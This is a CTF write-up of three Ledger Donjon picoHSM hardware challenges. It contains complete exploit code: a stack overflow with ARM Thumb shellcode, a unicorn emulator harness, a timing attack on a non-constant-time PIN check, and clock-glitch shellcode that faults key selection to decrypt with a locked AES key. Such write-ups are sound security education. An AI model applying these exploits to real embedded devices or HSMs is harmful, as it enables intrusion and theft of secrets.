---
layout: post
title: "Atmega Pwn: PicoHSM Challenges Donjon CTF Writeup"
categories: CTF Writeup
permalink: atmega-pwn-picohsm-donjon-ctf-writeup
author: Robin Jadoul
meta: "Atmega Pwn: PicoHSM Challenges Donjon CTF Writeup"
---

This was a series of three hardware exploitation challenges in [Ledger Donjon CTF](https://donjon.ledger.com/Capture-the-Fortress/). All three challenges built on each other and ran on the same physical hardware hosted by the organizers. Writeup by Robin_Jadoul.

## picoHSM Speed Dating (100pts)

> Looks like the brand new picoHSM is online. We don't really know what this product is... Time to have a look, and see how far we can go! But first, have a look at the firmware binary we managed to steal.
> There are 10 boards available on the network at picohsm.donjon-ctf.io, on ports ranging from 8001 to 8010. Try to pick one. All boards are exactly the same. You may not be alone trying to play. If connection fails, the equipment is probably already busy...
> We also know the admin resets and reflashes the boards every 15 minutes.
> Finally, we captured a photo of this equipment... you'll probably understand why this suffers poor performance...

*Unicorn, I choose you*

### Looking for clues
In this first challenge, all we get is a picture of the hardware board, and the firmware for one of the two MCUs that are on the board. The MCU for which we have the firmware is an STM32 ARM chip that runs in thumb mode. The other MCU is an Atmel processor, that acts as a secure coprocessor that is only accessible over a usart interface. Connecting to the hardware and/or decompiling the firmware a bit, we observe what functionality this board offers us:

```
help - print the list of commands.
info - print equipment info.
getflag [DEBUGKEY] - you already know what this is for...
pin - verify pin.
encrypt [PIN] [KEYID] [HEX] - encrypt a data blob.
decrypt [PIN] [KEYID] [HEX] - decrypt a data blob.
```

Let's have a look at what these commands do exactly:
- **help**: this simply outputs the above text
- **info**: this prints out some stuff, but nothing that looks really interesting
- **getflag**: checks if debug mode is enabled (this is not the case initially) and validates our input, the `DEBUGKEY`, against a 32-bit integer stored in memory; if both check pass, it prints out a flag, resets debug mode to false and samples a new `DEBUGKEY`
- **pin**: sends our input to the secure MCU that checks if it's valid
- **encrypt**: if the pin is correct, encrypts our data under a key id (in the range from 0 to 7); data must be a multiple of 16 bytes long; a key can be *locked* and make this operation fail
- **decrypt**: the corresponding decryption operation

For this first challenge, we'll have to target the most clearly visible flag, namely the one hiding behind a debug flag and a debug key. So we need to set the debug flag and either extract or modify the debug key. Or if we can get code execution, we can of course also just print out the flag for ourselves directly.

### Your stack doesn't care what architecture it's running
Looking closer at how the connection and our input are handled, we quickly find a severe vulnerability in the `handle_client` function: only 0x300 bytes are reserved on the stack, while 0x400 are being read. This will clearly allow us to smash the stack, and since we're dealing with an embedded system, there is no memory protection, so we can put shellcode on the stack and jump straight into it. With a little attention to how our input is parsed, we can just add enough "arguments" in our input before the shellcode, to make sure that spaces are not overwritten by nullbytes.

And this is where we start to get annoyed a bit: since the chip is a custom board and needs to interact with the other hardware (setting up networking, communicating over the usart, ...), we can't just run it in qemu. Since we didn't feel like blindly trying shellcode and manually computing stack addresses (not knowing there were two followup challenges at the time), we stopped working on this challenge for a while. After discovering there were other challenges to follow this one, we started looking at this again, and then someone suggested we could try using [unicorn](https://www.unicorn-engine.org/) to emulate the firmware. With some tweaks, we'd be able to ignore or emulate other hardware directly in our host program.

### Galloping though an ARM binary
I decided to give it a try with the python bindings to unicorn and try to extract the address where we can find the input buffer we control. Note that I will present the version of my emulator as it ended up after several improvements and gradual changes that also happened while solving the followup challenges.

First we do some setup with the help of pwntools to read information from the firmware. The binary contains the symbol `stack_top` (which is in the right location to indeed be the starting value of the stack according to the documentation of the MCU) which we will use in our initialization too. Most of the memory allocations are simply the result of emulating the firmware until an error occured, and observing what memory it tried to access.

```python
from unicorn import *
from unicorn.arm_const import *
from pwn import *
context.binary = exe = ELF("./firmware-mcu.elf")
context.arch = "thumb" # This wasn't handled automatically and is very useful for `asm` and `disasm`

STACK_SIZE = 1024**2 # Some size we choose here, it worked, so it's good enough :)
assert STACK_SIZE > len(exe.data)

mu = Uc(UC_ARCH_ARM, UC_MODE_THUMB)
mu.mem_map(exe.load_addr, STACK_SIZE)
mu.mem_write(exe.load_addr, exe.get_segment_for_address(exe.load_addr).data())
mu.mem_map(exe.sym["stack_top"] - STACK_SIZE, STACK_SIZE)
mu.reg_write(UC_ARM_REG_SP, exe.sym["stack_top"])
mu.mem_map(0xe000e000, STACK_SIZE)
mu.mem_map(0x40000000, STACK_SIZE)
mu.mem_map(0x50060000, STACK_SIZE)
```

Now that we've prepared unicorn to start emulating, we can start preparing some utilities to hook and patch the binary where needed.

```python
payload = "help" # What you'd send as input goes here

def printreg(mu, regn, reg):
    """Print the register name and the current value (in hex) to help in debugging"""
    info(f"r{regn}: 0x{mu.reg_read(reg):x}")

# These address will immediately return to `lr` and print out that the function was skipped
function_skips = {
        0x08000170: "rand_u32",
        0x0800058c: "setup_network",
        0x08000836: "usart_init",
        0x08000cae: "socket_t::socket_t",
        0x08000180: "sec_reset",
        0x080008ec: "usart::flush",
        0x08000f30: "socket_t::disconnect",
        }

def get_string(mu, addr):
    """Retrieve a string from memory, read starting at `addr` until a nullbyte is encountered"""
    r = b""
    while b"\0" not in r:
        r += mu.mem_read(addr, 0x20)
        addr += 0x20
    return r.split(b"\0")[0]

ok = False # We can use this to e.g. only start outputting executed instructions once a condition is met
def hook(mu, addr, sz, data):
    global last, ok
    last = addr #sometims useful while debugging

    # Some hooks that are not just skips
    if addr == 0x08001038:
        info(f"printing {get_string(mu, mu.reg_read(UC_ARM_REG_R1))}")
        if mu.reg_read(UC_ARM_REG_R0) != 0x20001fd8:
            mu.emu_stop()
            return
        mu.reg_write(UC_ARM_REG_PC, mu.reg_read(UC_ARM_REG_LR))
        return
    elif addr == 0x08000a0c:
        info(f"debug {get_string(mu, mu.reg_read(UC_ARM_REG_R0))}")
        mu.reg_write(UC_ARM_REG_PC, mu.reg_read(UC_ARM_REG_LR))
        return
    elif addr in function_skips:
        info("Skip " + function_skips[addr])
        mu.reg_write(UC_ARM_REG_PC, mu.reg_read(UC_ARM_REG_LR))
        return
    elif addr == 0x08000d00:
        info("socket_t::listen")
        if mu.reg_read(UC_ARM_REG_R0) != 0x20001fd8:
            mu.emu_stop()
            return
        mu.reg_write(UC_ARM_REG_R0, 0x1337)
        mu.reg_write(UC_ARM_REG_PC, mu.reg_read(UC_ARM_REG_LR))
        return
    elif addr == 0x08000ccc:
        info("socket_t::avail")
        if mu.reg_read(UC_ARM_REG_R0) != 0x20001fd8:
            mu.emu_stop()
            return
        mu.reg_write(UC_ARM_REG_R0, len(payload))
        mu.reg_write(UC_ARM_REG_PC, mu.reg_read(UC_ARM_REG_LR))
        return
    elif addr == 0x08001018:
        info("socket_t::read_avail")
        if mu.reg_read(UC_ARM_REG_R0) != 0x20001fd8:
            mu.emu_stop()
            return
        info(f"  > Reading 0x{mu.reg_read(UC_ARM_REG_R2):x} into 0x{mu.reg_read(UC_ARM_REG_R1):x}")
        info(f"  > {payload[:mu.reg_read(UC_ARM_REG_R2)]}")
        mu.mem_write(mu.reg_read(UC_ARM_REG_R1), payload[:mu.reg_read(UC_ARM_REG_R2)])
        mu.reg_write(UC_ARM_REG_PC, mu.reg_read(UC_ARM_REG_LR))
        return
    elif addr == 0x080008fa:
        info("usart::tx")
        if mu.reg_read(UC_ARM_REG_R0) != 0x20000000:
            warning("Nononono")
            mu.emu_stop()
            return
        info(f"  > 0x{mu.reg_read(UC_ARM_REG_R1):x} ({bytes([mu.reg_read(UC_ARM_REG_R1)])})")
        mu.reg_write(UC_ARM_REG_PC, mu.reg_read(UC_ARM_REG_LR))
        return
    elif addr == 0x08000936:
        info("usart::rx")
        if mu.reg_read(UC_ARM_REG_R0) != 0x20000000:
            warning("Nononono")
            mu.emu_stop()
            return
        mu.reg_write(UC_ARM_REG_R0, 42)
        mu.reg_write(UC_ARM_REG_PC, mu.reg_read(UC_ARM_REG_LR))
        return
    elif addr == 0x08001054:
        info(f"delay: {mu.reg_read(UC_ARM_REG_R0)}")
    # elif addr == SC_ADDR:
        # ok[0] = True
    if ok: info(f"Instruction at 0x{addr:x}: {disasm(mu.mem_read(addr, sz))}")
    if ok: printreg(mu, 'lr', UC_ARM_REG_LR)
mu.hook_add(UC_HOOK_CODE, hook)
```

Now all that's left is to actually start emulating at main and choose at which instruction to stop - in this case, somewhere once `handle_client` has returned.
```python
try: mu.emu_start(exe.sym["main"] | 1, 0x08000736)
except Exception as e: print(e)
# If something is crashing, you can access the state here again to investigate
```

You might have noticed in this previous code snippet that we choose the address `main | 1` to start the execution. In unicorn, this doesn't actually matter, but when executing on real hardware, this is a very important detail. Because we're running in thumb mode, this should always be indicated by having the LSB of `pc` be 1. This is a 0 when running in "regular" ARM. Note that for purposes of hooking the code, unicorn always has this LSB reset to 0.

### But does it run DOOM
Now that we can run and debug the firmware and our shellcode, all that's left is to actually write some shellcode and execute whatever we want. A few things we should keep in mind while doing this:

- We have some payload before the actual shellcode to avoid problems with the argument parsing
- All addresses we jump to should be thumb addresses
- We first should get back a handle on the socket, so that we can actually obtain output

To take care of that last point, we chose to extract the socket from the address on the stack where `execute_command` had temporarily stored it earlier. Even though it's not technically on an "active" part of the stack anymore, we know it can't have been overwritten yet anyway. Then we just prepare what the stack would look like at the moment `execute_command` would be printing the flag, set the return address to where `handle_client` would have returned, and just skip validating all that debug mode trouble.

```python
# Skipping some `pwn template` stuff here
BUFFER_ADDR = 0x20001cd0
shellcode = asm("""
        sub sp, sp, 0x33c
        pop {r4}
        add sp, sp, 0x338
        mov r5, sp

        eor r9, r9, r9
        orr r9, r9, 0x0800
        lsl r9, r9, 8
        orr r9, r9, 0x04
        lsl r9, r9, 8
        orr r9, r9, 0x0b

        eor lr, lr, lr
        orr lr, lr, 0x0800
        lsl lr, lr, 8
        orr lr, lr, 0x7
        lsl lr, lr, 8
        orr lr, lr, 0x25

        push {r0, r1, r2, r4, r5, r6, r7, lr}
        bx r9
""")

io = start()
io.recvuntil("seconds...")
initial = b'help a a a a a a a a a  '
SC_ADDR = BUFFER_ADDR + len(initial)
io.send(initial + shellcode + b' ' * (0x304 - len(initial) - len(shellcode)) + pack(SC_ADDR | 1))
io.stream()
```

One final minor annoyance here was that for some reason sending newlines or leaving our sending socket open seemed to make the remote hardware hang. So we simply don't send a newline, and implicitly close the sending half of the socket by using `io.stream()`. Our way of loading 32-bit constants into the shellcode is not the prettiest yet, but it was good enough at the time. During later iterations, this was improved somewhat.

Flag: `CTF{Ju5t_A_W4rmUP}`


## picoHSM Good Times (150pts)

> Nice job getting almost r00t on this platform, but there's still work to do. Looks like usage is protected by a 8-digits PIN code.
> Can you get this code for me ?
> By the way, we managed somehow to get some source code. Hope this helps.

*A wild followup challenge appeared.*

So after solving the first challenge in this series, we're now faced with its successor. As a plus, however, we now know what's actually running on that secure coprocessor.

```c++
#include <avr/io.h>
#include <avr/interrupt.h>
#include "uart.hxx"
#include "aes.hxx"
#include "keys.hxx"
#include "pin.hxx"


static const uint8_t* aes_keys[8] = {
    aes_key_0,
    aes_key_1,
    aes_key_2,
    aes_key_3,
    aes_key_4,
    aes_key_5,
    aes_key_6,
    aes_key_7
};


static const bool aes_key_locked[8] = {
    false, false, true, false, false, false, false, false
};


static const uint8_t aes_iv_zero[16] = {0};


enum instruction_t {
    INS_VERIFY_PIN = 1,
    INS_ENCRYPT = 2,
    INS_DECRYPT = 3
};


enum status_t {
    STATUS_OK = 1,
    STATUS_BAD_PIN = 2,
    STATUS_KEY_LOCKED = 3
};


/**
 * Process PIN verification. Reads 8 digits from the UART and compare with the
 * correct PIN. Does not reply on UART.
 *
 * @return 1 if PIN is correct, 0 otherwise.
 */
uint8_t verify_pin(){
    // Get input pin from UART
    uint8_t buffer[8];
    for (uint8_t i = 0; i < 8; ++i)
        buffer[i] = uart_read_u8();
    uint8_t good = 1;
    for (uint8_t i = 0; i < 8; ++i){
        if (pin[i] != buffer[i]){
            good = 0;
            break;
        }
    }
    return good;
}


int main()
{
    DDRA = 1;
    PORTA = 0;

    uart_init(625000);
    sei();

    for (;;)
    {
        PORTA &= ~1; // Turn LED ON
        uint8_t ins = uart_read_u8();
        PORTA |= 1; // Turn LED OFF
        switch (ins) {
            case INS_VERIFY_PIN: {
                // Verify pin
                uint8_t good = verify_pin();
                if (good == 1){
                    uart_write_u8(STATUS_OK);
                } else {
                    uart_write_u8(STATUS_BAD_PIN);
                }
                break;
            }

            case INS_ENCRYPT:
            case INS_DECRYPT: {
                // Verify pin
                uint8_t good = verify_pin();
                if (good){
                    uart_write_u8(STATUS_OK);
                    // Get key number.
                    // Protect with modulo (quick and dirty)
                    uint8_t key_id = uart_read_u8() % 8;
                    // Verify key is enabled
                    if (!aes_key_locked[key_id]){
                        uart_write_u8(STATUS_OK); // Send ack
                        AES_ctx ctx;
                        AES_init_ctx_iv(&ctx, aes_keys[key_id], aes_iv_zero);
                        // Get the number of blocks to be encrypted
                        uint8_t block_count = uart_read_u8();
                        // Encrypt and return on the fly
                        for (uint8_t i = 0; i < block_count; ++i){
                            uint8_t buf[16];
                            uart_read_buf(buf, 16);
                            if (ins == INS_ENCRYPT)
                                AES_CBC_encrypt_buffer(&ctx, buf, 16);
                            else
                                AES_CBC_decrypt_buffer(&ctx, buf, 16);
                            uart_write_buf(buf, 16);
                        }
                    } else {
                        // Send error byte to indicate key is locked
                        uart_write_u8(STATUS_KEY_LOCKED);
                    }
                } else {
                    uart_write_u8(STATUS_BAD_PIN);
                }
                break;
            }

            default:;
        }
    }
}
```

So now we can indeed confirm that the encryption/decryption is running AES and that the key with id 2 is locked. Of more relevance for this part of the series: `verify_pin`. That doesn't really look like a constant-time comparison to me, now does it?

We had already tried doing a timing attack before we had achieved remote code execution (mostly because we'd seen the name of this challenge mentioned in the discord server). The variability is however very low, and we cannot extract any accurate information on the pin from it.

What more can we do now that we can actually run our own code on the non-secure MCU? We *could* look at documentation, try to figure out how to perform timing on the devices and perform the entire attack there in shellcode. Of course, we *could* do that, but do we really want to? Instead, why don't we just amplify the signal-to-noise ratio by running a bunch of pin checks with the same input in a single connection. Then we can still do separate connections per attempted input, and do the timing conveniently from the outside.

Our shellcode gets a bit longer and more complex, and is now parametrized by the attempted pin.

```python
BUFFER_ADDR = 0x20001cd0
def push_dword(p):
    assert len(p) == 4
    return "\neor r0, r0, r0\n" + "\nlsl r0, r0, 8\n".join(f"orr r0, r0, {x}" for x in p) + "\npush {r0}\n"

def make_shellcode(attempt):
    return asm("""
            /* Retrieve a reference to the socket from the leftover stack of execute_command */
            sub sp, sp, 0x33c
            pop {r4}
            add sp, sp, 0x338

            /* r5 holds the address of the */
            ATTEMPT
            mov r5, sp

            /* r6 holds the pin verification address: 0x080001fc */
            mov r6, 0x0800
            lsl r6, r6, 8
            orr r6, r6, 0x1
            lsl r6, r6, 8
            orr r6, r6, 0xfd
            /* r7 holds the counter */
            mov r7, 1
            lsl r7, r7, 15

            loop:
            mov r0, r5
            bl run
            b afterrun
            run:
            bx r6
            afterrun:
            sub r7, r7, 1
            cbz r7, endrun
            b loop
            endrun:

            /* remove the pushed attempt again */
            add sp, sp, 0x8

            /* Ugly way to make a jump */
            eor r9, r9, r9
            orr r9, r9, 0x0800
            lsl r9, r9, 8
            orr r9, r9, 0x04
            lsl r9, r9, 8
            orr r9, r9, 0x0b

            /* Same ugly way to transfer control back to main where we came from */
            eor lr, lr, lr
            orr lr, lr, 0x0800
            lsl lr, lr, 8
            orr lr, lr, 0x7
            lsl lr, lr, 8
            orr lr, lr, 0x25

            /* Fake stack for execute_command */
            mov r5, sp
            push {r0, r1, r2, r4, r5, r6, r7, lr}
            /* Jump to the get_flag command part */
            bx r9
    """.replace("ATTEMPT", push_dword(attempt[4:][::-1]) + push_dword(attempt[:4][::-1])))

import time, sys, os
for c in string.digits:
    initial = b'help a a a a a a a a a  '
    assert len(initial) % 2 == 0
    SC_ADDR = BUFFER_ADDR + len(initial)
    shellcode = make_shellcode(c.encode() + b"a" * 7) # change this to do later digits, of course
    payload = initial + shellcode + b' ' * (0x304 - len(initial) - len(shellcode)) + pack(SC_ADDR | 1)

    io = start()
    io.recvuntil("seconds...")
    t = time.time()
    io.send(payload)
    io.stream()
    print(c, time.time() - t)
    io.close()
    time.sleep(15)
```

Let's not waste time writing more code to automatically detect what the right digit is, and just do that manually.

Flag: `CTF{Tada!13372020}`

## picoHSM On Steroids (300pts)

> Ok we got the PIN, but I failed decrypting this secret message...
> Maybe the board designers made a hardware mistake we can exploit?

*Your challenge evolved into desperation*

### Who's at fault here
Alright, now that we found the pin, we can start using the encrypt and decrypt functionality. The new information we obtained in the challenge are schematics of the board. And there's one comment in there that's particularly interesting:

> Note: reuse clocking from MCU to feed the Security MCU,
> This removes a crystal and reduces costs

Well, we have code running on the MCU, so what can we do with that clock then? Time to dive into some [documentation](https://www.st.com/resource/en/reference_manual/cd00225773-stm32f205xx-stm32f207xx-stm32f215xx-and-stm32f217xx-advanced-armbased-32bit-mcus-stmicroelectronics.pdf). With this document, and guided by the name of the `set_mco1_prescaler` function in the firmware, we can find how to change the scaling factor that's applied to the clock signal before it's used on the Atmega. If we can briefly speed up that clock (it's initially 5x slower than the MCU clock), we might be able to make the execution in the secure MCU glitch so that we can cleanly skip past the conditional that checks whether the key we're trying to use is locked.

Figuring out when exactly to speed up, and how long to wait before we speed down again is a fragile and painful process. At first, we started out trying things manually, hoping to get an idea of which delays end up affecting which part of the execution. Relatively frequently, we actually ended up faulting the key that was used, resulting in the decryption with another key than the locked one.

### Time and again
Roughly speaking, we were looking at two delay parameters to tweak: the time we wait before speeding up, and the time we wait before restoring the normal speed again. Furthermore, we could actually also play around with the amount by which we would actually speed things up.

After plenty of pain and exactly zero progress or intuition into when the glitch occurs, we finally decided to grab a virtual hammer and brute force delays. The little understanding we gained with the manual tweaking made us decide on the speed to use, and the intuition we had regardless of whatever we tried before made us go with only a brief delay between speeding up and down. That left us with only a single parameter to brute force, which would hopefully be within a reasonable range to see some results quickly.

To try and have some kind of reference where executing completely taps out, and the connection hangs, I decided to run the same brutefoce parameters on another instance, but using an unlocked key id 1 instead. Big was my surprise that suddenly that script gave me a flag output. Instead of faulting the lock condition, we ended up faulting the loading of the key, loading key 2 when asking for key 1. But a flag is a flag, and fault attacks are a pain, so I won't complain.

### Some assembly required
During all this experimentation several version of this shellcode were used in several attempts, but we'll only present the version that actually does result in a flag here. For those who got interested in the "cleaned up" version of loading 32-bit constants I hinted to in the writeup for the first part, your wait has now ended.

**Trigger warning**: a lot of painstakingly handwritten ARM assembly ahead.

```python
BUFFER_ADDR = 0x20001cd0
def push_dword(p):
    assert len(p) == 4
    return "\neor r0, r0, r0\n" + "\nlsl r0, r0, 8\n".join(f"orr r0, r0, {x}" for x in p) + "\npush {r0}\n"

def call(x):
    return f"ldr r9, ={x}; ldr r9, [r9]; blx r9"

BLOCK_COUNT = 2
SIZE = BLOCK_COUNT * 16
KEY_ID = 1

def make_shellcode(tm):
    return asm(f"""
            /* retrieve a ref to the socket, in r4 */
            sub sp, sp, 0x33c
            pop \{\{r4\}\}
            adds sp, sp, 0x338
            push \{\{r0, r1, r2, r3, r4, r5, r6, r7, r8, r9, r10, r11, r12\}\}

            /* r5 keeps the usart */
            mov r5, 1
            lsl r5, r5, 29

            ldr r1, [r5, 4]
            ldr r0, [r1, 0x100]
            str r0, [r1, 0x104]

            /* tx the decryption command and pin */
            mov r0, r5
            mov r1, 3
            {call('TX')}
            mov r8, r9

            mov r0, r5
            ldr r1, =PIN
            mov r2, 8
            {call('TX_BUF')}

            /* rx the pin response */
            mov r0, r5
            {call('RX')} /*  now r8 = tx, r9 = rx */
            mov r6, r9
            subs r0, r0, 1
            cbz r0, NOSTOP_PIN
            b END
            NOSTOP_PIN:

            ldr r10, =PRESCALER_REGISTER
            ldr r10, [r10]
            ldr r11, [r10]
            mov r12, 3
            lsl r12, 24
            bic r12, r11, r12

            mov r0, r5
            mov r1, {KEY_ID} /* key id, 2 is the locked one*/
            blx r8

            mov r0, {tm}
            lsl r0, 4
            {call('DELAY')}
            str r12, [r10]
            mov r0, 10
            blx r9
            str r11, [r10]

            mov r0, r5
            blx r6 /* receive key lock verdict */
            subs r0, r0, 3
            cbnz r0, NOSTOP
            ldr r1, =PIN
            add r0, r0, 0x33
            strb r0, [r1]
            mov r0, r4
            {call('PRINT')}
            b END
            NOSTOP:
            /* verified to be status_ok */

            /* send block count*/
            mov r0, r5
            mov r1, {BLOCK_COUNT}
            blx r8

            /* Send the payload */
            mov r0, r5
            ldr r1, =PLAINTEXT
            mov r2, {SIZE}
            {call('TX_BUF')}

            /* recv the decryption */
            { push_dword((BUFFER_ADDR - 0x100).to_bytes(4, 'big')) }
            pop {{r7}} /* r7 holds base writing address */
            mov r0, r5
            mov r1, r7
            mov r2, {hex(SIZE)}
            {call('RX_BUF')}

            /* to hex */
            mov r0, r7
            mov r1, {hex(SIZE)}
            adds r2, r7, {hex(SIZE)}
            {call('TO_HEX')}

            /* and print it */
            mov r0, 10
            str r0, [r7, {hex(3*SIZE)}]
            mov r0, r4
            adds r1, r7, {hex(SIZE)}
            {call('PRINT')}

            END:
            pop \{\{r0, r1, r2, r3, r4, r5, r6, r7, r8, r9, r10, r11, r12\}\}
            mov r5, sp
            ldr lr, =RET_ADDR
            ldr lr, [lr]
            bx lr /* Skip printing the easy flag, jump right back to main */
            push \{\{r0, r1, r2, r4, r5, r6, r7, lr\}\}
            ldr r9, =EASY_FLAG
            ldr r9, [r9]
            bx r9

            RX: .word 0x08000937
            RX_BUF: .word 0x08000965
            TX: .word 0x080008fb
            TX_BUF: .word 0x0800091d
            PRINT: .word 0x08001039
            TO_HEX: .word 0x080011ad
            DELAY: .word 0x08001055
            WRITE: .word 0x08000ea5

            PRESCALER_REGISTER: .word 0x40023808
            PIN: .asciz "13372020\\n"
            PLAINTEXT: .byte 0x19, 0x6b, 0xc5, 0x15, 0xf3, 0x9b, 0xa5, 0x41, 0xbe, 0xf8, 0xe0, 0xfb, 0x5e, 0x74, 0xc2, 0xcb, 0x2d, 0x00, 0x6e, 0xf5, 0xd1, 0x14, 0x50, 0xfc, 0x86, 0x03, 0x01, 0xa2, 0x65, 0xc8, 0xe6, 0x84

            EASY_FLAG: .word 0x0800040b
            RET_ADDR: .word 0x08000725
    """, vma=SC_ADDR)


import time
initial = b'help a a a a a a a a a \0'
assert len(initial) % 2 == 0
SC_ADDR = BUFFER_ADDR + len(initial)
shellcode = make_shellcode(8) # This was originally in a loop, but 8 was determined to be the reliably working value
assert len(initial) + len(shellcode) < 0x300
print(hex(len(shellcode)))
payload = initial + shellcode + b' ' * (0x304 - len(initial) - len(shellcode)) + pack(SC_ADDR | 1)

while True:
    try:
        io = start()
        io.recvuntil("seconds...")
        io.send(payload)
        io.stream()
        break
    except EOFError:
        time.sleep(15)
```

Flag: `CTF{t1s bUt a scr4tch}`

